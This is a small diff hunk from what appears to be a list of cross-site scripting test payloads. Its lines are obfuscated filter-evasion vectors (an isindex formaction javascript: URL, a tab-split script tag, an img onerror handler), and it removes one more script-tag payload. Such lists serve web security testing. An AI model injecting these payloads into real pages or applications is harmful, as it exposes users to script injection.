@@ -12,7 +12,6 @@
 <form><isindex formaction="javascript&colon;confirm(1)"
 <script/&Tab; src='https://github.com' /&Tab;></script>
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
-<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
 
 
 
